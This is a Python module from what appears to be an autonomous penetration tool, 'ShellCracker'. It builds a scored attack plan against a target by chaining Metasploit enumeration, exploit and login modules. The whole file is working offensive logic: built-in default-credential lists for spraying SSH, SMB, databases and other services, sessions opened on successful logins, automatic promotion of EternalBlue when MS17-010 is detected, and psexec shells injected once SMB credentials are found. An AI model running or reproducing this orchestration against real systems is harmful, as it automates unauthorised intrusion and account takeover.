"""The autonomous attack brain: turn a target profile into a ranked plan.

This module is what makes ShellCracker *decide* rather than just run a list.
Given a :class:`~core.profiler.TargetProfile` it builds an :class:`AttackPlan`
— a scored, phased set of :class:`AttackVector` objects — by walking a broad
per-category playbook (the decision tree) and by searching Metasploit for
version-matched exploits.

Design
------
* **Phases** run in a fixed order so cheap, safe intel comes before loud,
  destructive actions::

      enumerate  -> exploit  -> credentials  -> misconfig

  Enumeration findings are fed back via :meth:`StrategyEngine.incorporate`,
  which can raise the score of queued vectors or inject brand-new ones (e.g.
  "MS17-010 looks vulnerable" promotes EternalBlue; a discovered credential
  injects a psexec vector). That feedback loop is what "evaluate every avenue
  and adapt" means in practice.

* **Scoring** is transparent and tunable (``strategy.weights`` in config)::

      score = category_weight
            + rank_points           (MSF reliability, 0..40)
            + version_match_points  (0 / 10 / 20)
            + adaptive_boost        (set when a finding enables the vector)
            - noise_penalty         (credential spraying is noisier)

  Within a phase, higher score is tried first.

The engine itself never contacts the target. It only queries local databases
(the Metasploit module DB). All actual execution happens in the executor.
"""

from __future__ import annotations

import itertools
import logging
from dataclasses import dataclass, field
from typing import Any

from . import matcher
from .profiler import CATEGORY_WEIGHT, TargetProfile
from .recon import Service

logger = logging.getLogger("ShellCracker.strategy")

# Phase execution order. The executor honours this unless config overrides it.
PHASES = ("enumerate", "exploit", "credentials", "misconfig")

# MSF rank -> points (0..40), blended into a vector's score.
_RANK_POINTS = {
    "excellent": 40, "great": 34, "good": 26,
    "normal": 18, "average": 12, "low": 6, "manual": 2,
}

# --- Built-in credential lists (small on purpose: lab default-cred checks, not
# real brute force). Extend via config strategy.credentials.extra_* ----------
_COMMON_USERS = [
    "root", "admin", "administrator", "user", "guest", "msfadmin",
    "service", "test", "sys", "operator",
]
_COMMON_PASSWORDS = [
    "", "password", "admin", "root", "toor", "msfadmin", "123456",
    "letmein", "pass", "test", "changeme", "admin123",
]
# Service-specific seed accounts layered on top of the common lists.
_SERVICE_USERS: dict[str, list[str]] = {
    "mysql": ["root", "mysql", "admin"],
    "mssql": ["sa", "admin"],
    "postgres": ["postgres", "admin"],
    "oracle": ["system", "sys", "scott", "oracle"],
    "ssh": ["root", "admin", "user", "msfadmin"],
    "ftp": ["ftp", "anonymous", "admin", "user"],
    "telnet": ["root", "admin", "msfadmin"],
    "smb": ["administrator", "admin", "guest"],
    "vnc": ["root", "admin"],
}
_SERVICE_PASSWORDS: dict[str, list[str]] = {
    "mysql": ["", "root", "mysql", "password"],
    "mssql": ["", "sa", "password", "Password1"],
    "postgres": ["", "postgres", "password"],
    "oracle": ["oracle", "system", "manager", "tiger", "change_on_install"],
    "ssh": ["", "root", "toor", "msfadmin", "password", "admin"],
    "ftp": ["", "ftp", "anonymous", "password"],
    "scott": ["tiger"],
}


@dataclass
class AttackVector:
    """One concrete thing the engine decided is worth trying."""

    phase: str                 # one of PHASES
    kind: str                  # exploit | enum | login | misconfig
    module: str                # msf module path WITHOUT the type prefix
    module_type: str           # "exploit" | "auxiliary"
    category: str              # service category this vector belongs to
    service_port: int
    service_name: str = ""
    score: float = 0.0
    rationale: str = ""
    options: dict[str, Any] = field(default_factory=dict)
    source: str = "playbook"   # playbook | version-match | adaptive
    # Set True once executed so the adaptive loop does not re-run it.
    done: bool = False

    @property
    def key(self) -> str:
        """Identity used for de-duplication (module + port)."""
        return f"{self.module_type}/{self.module}@{self.service_port}"

    def to_dict(self) -> dict[str, Any]:
        return {
            "phase": self.phase,
            "kind": self.kind,
            "module": f"{self.module_type}/{self.module}",
            "category": self.category,
            "port": self.service_port,
            "service": self.service_name,
            "score": round(self.score, 1),
            "rationale": self.rationale,
            "source": self.source,
            # Internal keys (leading underscore) are omitted from the report.
            "options": {k: v for k, v in self.options.items() if not k.startswith("_")},
        }


@dataclass
class Finding:
    """A fact produced by executing a vector, fed back into the engine."""

    key: str                   # e.g. "smb.ms17_010", "creds", "ftp.anonymous"
    value: Any
    port: int = 0
    category: str = ""
    detail: str = ""


class AttackPlan:
    """An ordered, de-duplicated collection of attack vectors."""

    def __init__(self) -> None:
        self._vectors: list[AttackVector] = []
        self._seen: set[str] = set()

    def add(self, vector: AttackVector) -> bool:
        """Add a vector unless an identical (module@port) one already exists."""
        if vector.key in self._seen:
            return False
        self._seen.add(vector.key)
        self._vectors.append(vector)
        return True

    def all(self) -> list[AttackVector]:
        return list(self._vectors)

    def pending(self, phase: str) -> list[AttackVector]:
        """Not-yet-run vectors for ``phase``, best score first."""
        return sorted(
            (v for v in self._vectors if v.phase == phase and not v.done),
            key=lambda v: v.score,
            reverse=True,
        )

    def boost(self, module: str, delta: float, note: str = "") -> bool:
        """Raise the score of a queued vector by module name (adaptive feedback)."""
        for v in self._vectors:
            if v.module == module and not v.done:
                v.score += delta
                if note:
                    v.rationale = f"{v.rationale} | {note}" if v.rationale else note
                return True
        return False

    def __len__(self) -> int:  # pragma: no cover - trivial
        return len(self._vectors)


class StrategyEngine:
    """Builds and adaptively evolves the attack plan for one target."""

    def __init__(
        self, profile: TargetProfile, msf_client: Any, config: dict[str, Any]
    ) -> None:
        self.profile = profile
        self.client = msf_client
        self.cfg = (config or {}).get("strategy", {}) or {}
        self.weights = {
            "category": 1.0, "rank": 1.0, "version_match": 1.0, "noise_penalty": 1.0,
            **(self.cfg.get("weights", {}) or {}),
        }
        self.cred_cfg = self.cfg.get("credentials", {}) or {}
        self.plan = AttackPlan()
        self._lport_counter = itertools.count()

    # -- scoring -------------------------------------------------------------
    def _score(
        self,
        category: str,
        kind: str,
        rank: str = "normal",
        version_match: int = 0,
        adaptive_boost: float = 0.0,
    ) -> float:
        w = self.weights
        score = w["category"] * CATEGORY_WEIGHT.get(category, 8)
        score += w["rank"] * _RANK_POINTS.get(rank.lower(), 18) * (
            1.0 if kind == "exploit" else 0.4  # non-exploit modules weigh rank less
        )
        score += w["version_match"] * {0: 0, 1: 10, 2: 20}.get(version_match, 0)
        if kind == "login":
            score -= w["noise_penalty"] * 12  # credential spraying is louder
        if kind == "enum":
            score += 100  # enumeration is cheap/safe -> always ordered first
        return score + adaptive_boost

    # -- credential lists ----------------------------------------------------
    def _creds_for(self, category: str) -> tuple[list[str], list[str]]:
        users = list(dict.fromkeys(
            _SERVICE_USERS.get(category, []) + _COMMON_USERS
            + list(self.cred_cfg.get("extra_users", []) or [])
        ))
        passwords = list(dict.fromkeys(
            _SERVICE_PASSWORDS.get(category, []) + _COMMON_PASSWORDS
            + list(self.cred_cfg.get("extra_passwords", []) or [])
        ))
        return users, passwords

    def _login_vector(
        self, category: str, service: Service, module: str, extra: dict[str, Any] | None = None
    ) -> AttackVector | None:
        """Build a login-scanner vector with the built-in credential lists."""
        if not self.cred_cfg.get("enabled", True):
            return None
        users, passwords = self._creds_for(category)
        options: dict[str, Any] = {
            "RHOSTS": self.profile.target,
            "RPORT": service.port,
            "BLANK_PASSWORDS": True,
            "USER_AS_PASS": True,
            "STOP_ON_SUCCESS": bool(self.cred_cfg.get("stop_on_first_valid", True)),
            "VERBOSE": False,
            "CreateSession": True,     # ssh/telnet login scanners drop a session on success
            # Internal: executor materialises these into temp USER_FILE/PASS_FILE.
            "_users": users,
            "_passwords": passwords,
        }
        if extra:
            options.update(extra)
        return AttackVector(
            phase="credentials", kind="login", module=module, module_type="auxiliary",
            category=category, service_port=service.port, service_name=service.name,
            rationale=f"{category} varsayilan/zayif kimlik denemesi "
                      f"({len(users)}u×{len(passwords)}p, blank+user=pass)",
            options=options,
            score=self._score(category, "login"),
        )

    def _enum_vector(
        self, category: str, service: Service, module: str, rationale: str,
        options: dict[str, Any] | None = None,
    ) -> AttackVector:
        opts = {"RHOSTS": self.profile.target, "RPORT": service.port}
        if options:
            opts.update(options)
        return AttackVector(
            phase="enumerate", kind="enum", module=module, module_type="auxiliary",
            category=category, service_port=service.port, service_name=service.name,
            rationale=rationale, options=opts,
            score=self._score(category, "enum"),
        )

    # -- the version-matched exploit net (applies to every service) ----------
    def _add_version_exploits(self, category: str, service: Service) -> None:
        if self.client is None:
            return
        cands = matcher.exploit_candidates_for_service(service, self.client)
        cap = int(self.cfg.get("max_exploits_per_service", 6))
        for cand in cands[:cap]:
            vm = matcher.version_match_strength(cand.module, service)
            vector = AttackVector(
                phase="exploit", kind="exploit", module=cand.module,
                module_type="exploit", category=category,
                service_port=service.port, service_name=service.name,
                rationale=(
                    f"{service.banner or service.name} icin MSF exploit "
                    f"(rank={cand.rank}" + (", surum eslesti" if vm == 2 else
                     ", urun eslesti" if vm == 1 else "") + ")"
                ),
                source="version-match",
                score=self._score(category, "exploit", rank=cand.rank, version_match=vm),
                options={"RHOSTS": self.profile.target, "RPORT": service.port},
            )
            self.plan.add(vector)

    # -- per-category playbooks (the decision tree) --------------------------
    def _plan_ftp(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("ftp", svc, "scanner/ftp/ftp_version",
                                        "FTP surum/banner tespiti"))
        self.plan.add(self._enum_vector("ftp", svc, "scanner/ftp/anonymous",
                                        "Anonim FTP erisimi kontrolu (misconfig)"))
        v = self._login_vector("ftp", svc, "scanner/ftp/ftp_login")
        if v:
            self.plan.add(v)

    def _plan_ssh(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("ssh", svc, "scanner/ssh/ssh_version",
                                        "SSH surum/algoritma tespiti"))
        v = self._login_vector("ssh", svc, "scanner/ssh/ssh_login")
        if v:
            self.plan.add(v)

    def _plan_telnet(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("telnet", svc, "scanner/telnet/telnet_version",
                                        "Telnet banner tespiti"))
        v = self._login_vector("telnet", svc, "scanner/telnet/telnet_login")
        if v:
            self.plan.add(v)

    def _plan_smb(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("smb", svc, "scanner/smb/smb_version",
                                        "SMB surum/dialect ve OS tespiti"))
        self.plan.add(self._enum_vector("smb", svc, "scanner/smb/smb_ms17_010",
                                        "MS17-010 (EternalBlue) zafiyet kontrolu"))
        self.plan.add(self._enum_vector("smb", svc, "scanner/smb/smb_enumshares",
                                        "SMB paylasim listesi / null session"))
        self.plan.add(self._enum_vector("smb", svc, "scanner/smb/smb_enumusers",
                                        "SMB kullanici listesi"))
        v = self._login_vector("smb", svc, "scanner/smb/smb_login")
        if v:
            self.plan.add(v)

    def _plan_web(self, svc: Service) -> None:
        for mod, why in (
            ("scanner/http/http_version", "HTTP sunucu/sürüm tespiti"),
            ("scanner/http/http_header", "HTTP baslik/teknoloji tespiti"),
            ("scanner/http/robots_txt", "robots.txt gizli yol tespiti"),
            ("scanner/http/dir_scanner", "Yaygin dizin/panel taramasi"),
        ):
            self.plan.add(self._enum_vector("web", svc, mod, why))

    def _plan_mysql(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("mysql", svc, "scanner/mysql/mysql_version",
                                        "MySQL surum tespiti"))
        v = self._login_vector("mysql", svc, "scanner/mysql/mysql_login")
        if v:
            self.plan.add(v)

    def _plan_mssql(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("mssql", svc, "scanner/mssql/mssql_ping",
                                        "MSSQL ornek/surum tespiti"))
        v = self._login_vector("mssql", svc, "scanner/mssql/mssql_login")
        if v:
            self.plan.add(v)

    def _plan_postgres(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("postgres", svc, "scanner/postgres/postgres_version",
                                        "PostgreSQL surum tespiti"))
        v = self._login_vector("postgres", svc, "scanner/postgres/postgres_login")
        if v:
            self.plan.add(v)

    def _plan_oracle(self, svc: Service) -> None:
        v = self._login_vector("oracle", svc, "admin/oracle/oracle_login")
        if v:
            self.plan.add(v)

    def _plan_redis(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("redis", svc, "scanner/redis/redis_server",
                                        "Redis kimliksiz erisim / surum"))

    def _plan_mongodb(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("mongodb", svc, "scanner/mongodb/mongodb_login",
                                        "MongoDB kimliksiz erisim kontrolu"))

    def _plan_rpc(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("rpc", svc, "scanner/nfs/nfsmount",
                                        "NFS disa acik paylasim (showmount)"))

    def _plan_snmp(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("snmp", svc, "scanner/snmp/snmp_login",
                                        "SNMP community string denemesi (public/private)"))
        self.plan.add(self._enum_vector("snmp", svc, "scanner/snmp/snmp_enum",
                                        "SNMP uzerinden sistem bilgisi toplama"))

    def _plan_vnc(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("vnc", svc, "scanner/vnc/vnc_none_auth",
                                        "VNC kimliksiz erisim kontrolu"))
        v = self._login_vector("vnc", svc, "scanner/vnc/vnc_login", extra={"USERNAME": ""})
        if v:
            self.plan.add(v)

    def _plan_rdp(self, svc: Service) -> None:
        self.plan.add(self._enum_vector("rdp", svc, "scanner/rdp/rdp_scanner",
                                        "RDP surum/NLA tespiti"))

    _PLANNERS = {
        "ftp": "_plan_ftp", "ssh": "_plan_ssh", "telnet": "_plan_telnet",
        "smb": "_plan_smb", "web": "_plan_web", "mysql": "_plan_mysql",
        "mssql": "_plan_mssql", "postgres": "_plan_postgres", "oracle": "_plan_oracle",
        "redis": "_plan_redis", "mongodb": "_plan_mongodb", "rpc": "_plan_rpc",
        "snmp": "_plan_snmp", "vnc": "_plan_vnc", "rdp": "_plan_rdp",
    }

    def build(self) -> AttackPlan:
        """Walk every open service through its playbook and the exploit net."""
        for category in self.profile.categories():
            planner = self._PLANNERS.get(category)
            for svc in self.profile.categorized[category]:
                # 1) category-specific enum / login playbook (the decision tree)
                if planner:
                    getattr(self, planner)(svc)
                # 2) the broad version-matched MSF exploit net (every service)
                self._add_version_exploits(category, svc)

        logger.info(
            "Strateji: %d vektor planlandi (%s).",
            len(self.plan),
            ", ".join(
                f"{p}={len(self.plan.pending(p))}" for p in PHASES
                if self.plan.pending(p)
            ) or "bos",
        )
        return self.plan

    # -- adaptive feedback ---------------------------------------------------
    def incorporate(self, findings: list[Finding]) -> list[AttackVector]:
        """React to enumeration findings: boost or inject vectors.

        Returns any brand-new vectors added, so the caller can log them.
        """
        new: list[AttackVector] = []
        for f in findings:
            if f.key == "smb.ms17_010":
                # Confirmed-vulnerable SMB -> promote EternalBlue hard.
                mod = "windows/smb/ms17_010_eternalblue"
                if not self.plan.boost(mod, 200, "MS17-010 ZAFIYETLI tespit edildi"):
                    v = AttackVector(
                        phase="exploit", kind="exploit", module=mod, module_type="exploit",
                        category="smb", service_port=f.port or 445, service_name="microsoft-ds",
                        rationale="MS17-010 tarayici ZAFIYETLI dedi -> EternalBlue",
                        source="adaptive", score=400,
                        options={"RHOSTS": self.profile.target, "RPORT": f.port or 445},
                    )
                    if self.plan.add(v):
                        new.append(v)

            elif f.key == "ftp.anonymous":
                self.profile.add_fact("ftp.anonymous", True)
                self.profile.notes.append(f"Anonim FTP acik (port {f.port}).")

            elif f.key == "smb.null_session":
                self.profile.add_fact("smb.null_session", True)

            elif f.key == "creds":
                # value: (user, password). A credential unlocks psexec on SMB
                # and is proof-of-foothold everywhere else.
                user, pw = f.value
                self.profile.add_credential(f.category, f.port, user, pw)
                if f.category == "smb":
                    mod = "windows/smb/psexec"
                    v = AttackVector(
                        phase="exploit", kind="exploit", module=mod, module_type="exploit",
                        category="smb", service_port=f.port or 445, service_name="microsoft-ds",
                        rationale=f"Gecerli SMB kimligi ({user}) -> psexec ile shell",
                        source="adaptive", score=350,
                        options={
                            "RHOSTS": self.profile.target, "RPORT": f.port or 445,
                            "SMBUser": user, "SMBPass": pw,
                        },
                    )
                    if self.plan.add(v):
                        new.append(v)

            elif f.key == "product":
                # Enumeration refined a product string -> re-run the exploit net.
                svc = Service(port=f.port, protocol="tcp", state="open",
                              name=f.category, product=str(f.value))
                before = len(self.plan)
                self._add_version_exploits(f.category, svc)
                if len(self.plan) > before:
                    new.extend(self.plan.all()[before:])

        if new:
            logger.info("Adaptif: %d yeni vektor eklendi.", len(new))
        return new
